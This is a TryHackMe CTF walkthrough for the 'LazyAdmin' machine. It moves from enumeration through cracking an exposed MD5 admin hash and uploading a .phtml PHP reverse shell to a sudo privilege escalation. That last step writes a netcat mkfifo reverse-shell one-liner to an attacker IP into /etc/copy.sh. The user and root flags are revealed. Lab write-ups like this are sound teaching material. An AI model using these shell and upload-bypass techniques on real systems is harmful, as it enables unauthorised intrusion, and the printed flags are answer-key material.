# LazyAdmin — TryHackMe Walkthrough

> Easy Linux machine to practice your skills.

<p align="center">
  <a href="https://imgbb.com/"><img src="https://i.ibb.co/0SYg87T/efbb70493ba66dfbac4302c02ad8facf.jpg" alt="efbb70493ba66dfbac4302c02ad8facf" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/lazyadmin">
    <img src="https://img.shields.io/badge/TryHackMe-LazyAdmin-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-Enumeration%20%7C%20Hash%20Cracking%20%7C%20PrivEsc-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Web Enumeration |
| 3 | Backup File Inspection |
| 4 | Hash Cracking (MD5) |
| 5 | Misconfigured Sudo Binaries |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Enumerate open ports and identify web services using Nmap
- Use directory brute-forcing to discover hidden CMS paths
- Locate and read a database backup file exposed via the web
- Crack an MD5 password hash to retrieve plaintext credentials
- Upload a PHP reverse shell through a CMS media panel
- Identify and abuse a misconfigured `sudo` rule for privilege escalation

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, Dirsearch or Gobuster, and Netcat installed

---

## Task 1 — Lazy Admin

> Note: It might take 2-3 minutes for the machine to boot before it is accessible.

---

### Step 1 — Network Enumeration

**Approach:** Run an aggressive Nmap scan to identify open ports and the services running on the target machine.

```
kali@kali:~/CTFs/tryhackme/LazyAdmin$ sudo nmap -A -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 18:57 CEST
Nmap scan report for Machine_IP
Host is up (0.061s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.74 seconds
```

> **Note:** Only two ports are open — **SSH on 22** and **HTTP on 80**. The web server shows the default Apache page, meaning actual content is hosted in a subdirectory. This is the cue to run a directory brute-force scan next.

---

### Step 2 — Web Enumeration (First Pass)

**Approach:** Use Dirsearch to brute-force directories on the web root and discover any hidden paths.

```
kali@kali:~/CTFs/tryhackme/LazyAdmin$ sudo /opt/dirsearch/dirsearch.py -u Machine_IP -w /usr/share/dirb/wordlists/common.txt -e html,php

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4613

Target: Machine_IP

[18:58:34] Starting:
[18:58:39] 301 -  316B  - /content  ->  http://Machine_IP/content/
[18:58:41] 200 -   11KB - /index.html
[18:58:45] 403 -  278B  - /server-status

Task Completed
```

> **Note:** A `/content` directory is discovered with a `301 Redirect`. Navigating to `http://Machine_IP/content/` reveals a **SweetRice CMS** installation page:
>
> *"Welcome to SweetRice - Thank your for install SweetRice as your website management system. This site is building now, please come late."*
>
> SweetRice is a lightweight CMS that is known to have several publicly disclosed vulnerabilities. Finding it here gives us a clear target for deeper enumeration.

---

### Step 3 — Web Enumeration (Second Pass on /content)

**Approach:** Run Dirsearch again, this time targeting the `/content` subdirectory specifically to enumerate what is installed inside the CMS.

```
kali@kali:~/CTFs/tryhackme/LazyAdmin$ sudo /opt/dirsearch/dirsearch.py -u Machine_IP/content -w /usr/share/dirb/wordlists/common.txt -e html,php

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4613

Target: Machine_IP/content

[19:01:38] Starting:
[19:01:39] 301 -  324B  - /content/_themes  ->  http://Machine_IP/content/_themes/
[19:01:42] 301 -  319B  - /content/as  ->  http://Machine_IP/content/as/
[19:01:42] 301 -  327B  - /content/attachment  ->  http://Machine_IP/content/attachment/
[19:01:47] 301 -  323B  - /content/images  ->  http://Machine_IP/content/images/
[19:01:48] 301 -  320B  - /content/inc  ->  http://Machine_IP/content/inc/
[19:01:48] 200 -    2KB - /content/index.php
[19:01:48] 301 -  319B  - /content/js  ->  http://Machine_IP/content/js/

Task Completed
```

> **Note:** Several important directories are revealed. `/content/as/` is the **admin login panel** for SweetRice. `/content/inc/` is an internal directory that, when browsed, exposes a `mysql_backup/` subfolder — a critical finding. Never overlook `inc` or `includes` directories in web applications, as they frequently contain configuration files, backups, or credentials.

---

### Step 4 — Extracting Credentials from the MySQL Backup

**Approach:** Navigate to `http://Machine_IP/content/inc/mysql_backup/` in the browser. A SQL backup file is publicly accessible. Download and read it — it contains the admin username and a hashed password.

The relevant line extracted from the backup file:

```sql
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

> **Note:** Inside the SQL dump, two key fields stand out — `admin` has the value `manager` (the username), and `passwd` contains `42f749ade7f9e195bf475f37a44cafcb` (an MD5 hash). MD5 hashes are 32 characters long and no longer considered secure. They can be cracked quickly using online tools like [CrackStation](https://crackstation.net) or [Hashes.com](https://hashes.com), or offline with Hashcat. The hash cracks to: **`Password123`**.
>
> This gives us the admin credentials: **`manager:Password123`**

---

### Step 5 — Logging into SweetRice and Uploading a Reverse Shell

**Approach:** Log in to the SweetRice admin panel at `http://Machine_IP/content/as/` using the cracked credentials. Navigate to **Media Center** at `http://Machine_IP/content/as/?type=media_center` and upload a PHP reverse shell. Rename the file with a `.phtml` extension to bypass basic file upload filters.

> **Note:** Many web applications block `.php` file uploads but fail to restrict alternative PHP extensions such as `.phtml`, `.php5`, or `.phar`. Apache will still execute `.phtml` files as PHP, making this a reliable bypass. Set your reverse shell IP and port before uploading, then trigger it by browsing to `http://Machine_IP/content/attachment/php-reverse-shell.phtml`.

---

### Step 6 — Catching the Shell and Reading user.txt

**Approach:** Start a Netcat listener before triggering the uploaded shell. Once the connection is received, navigate to the user's home directory and read the user flag.

```
kali@kali:~/CTFs/tryhackme/LazyAdmin$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [Machine_IP] 55546
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 20:09:00 up 13 min,  0 users,  load average: 0.01, 0.08, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd /home
$ ls
itguy
$ cd itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

> **Note:** The shell connects as `www-data`. In the user `itguy`'s home directory, several interesting files are present alongside `user.txt`. The file `mysql_login.txt` likely contains database credentials, and `backup.pl` is a Perl script — both worth examining during privilege escalation.

---

### Step 7 — Privilege Escalation via Misconfigured Sudo Rule

**Approach:** Check what commands `www-data` can run with sudo using `sudo -l`. The output reveals a passwordless sudo rule for a Perl script. Inspect that script, then write a reverse shell payload into the file it calls, and trigger it via sudo.

```
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 9002 >/tmp/f' >/etc/copy.sh
$ sudo /usr/bin/perl /home/itguy/backup.pl
rm: cannot remove '/tmp/f': No such file or directory
```

> **Note:** The sudo rule allows `www-data` to run `/usr/bin/perl /home/itguy/backup.pl` as **any user without a password**. Inspecting `backup.pl` shows it calls `/etc/copy.sh` — a shell script that `www-data` has write access to. By overwriting `/etc/copy.sh` with a reverse shell command and then triggering `backup.pl` via sudo, the reverse shell executes with **root privileges**. The `rm: cannot remove '/tmp/f'` message is harmless — it just means the pipe file did not exist yet.

---

### Step 8 — Catching the Root Shell and Reading root.txt

**Approach:** Start a second Netcat listener on a different port before triggering the sudo command. The root shell connects immediately.

```
kali@kali:~/CTFs/tryhackme/LazyAdmin$ nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.8.106.222] from (UNKNOWN) [Machine_IP] 58634
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

> **Note:** The `id` command confirms we are running as `uid=0(root)` — full system compromise achieved. The root flag is found directly in `/root/root.txt`.

---

### Question 1 — What is the user flag?

<details>
<summary>Reveal Answer</summary>

**`THM{63e5bce9271952aad1113b6f1ac28a07}`**

</details>

---

### Question 2 — What is the root flag?

<details>
<summary>Reveal Answer</summary>

**`THM{6637f41d0177b6f37cb20d775124699f}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Found SSH on port 22 and Apache HTTP on port 80 |
| 2 | Dirsearch on web root | Discovered `/content` running SweetRice CMS |
| 3 | Dirsearch on `/content` | Found admin panel at `/content/as/` and backup files at `/content/inc/` |
| 4 | MySQL backup inspection | Extracted MD5 hash `42f749ade7f9e195bf475f37a44cafcb` → cracked to `Password123` |
| 5 | SweetRice admin login | Authenticated as `manager:Password123` |
| 6 | PHP reverse shell upload via Media Center | Uploaded `.phtml` shell, triggered it to gain `www-data` shell |
| 7 | Read `user.txt` | Found user flag in `/home/itguy/` |
| 8 | `sudo -l` enumeration | Discovered passwordless sudo rule for `backup.pl` calling `/etc/copy.sh` |
| 9 | Overwrote `/etc/copy.sh` with reverse shell | Triggered via sudo perl to get root shell |
| 10 | Read `root.txt` | Found root flag in `/root/` |
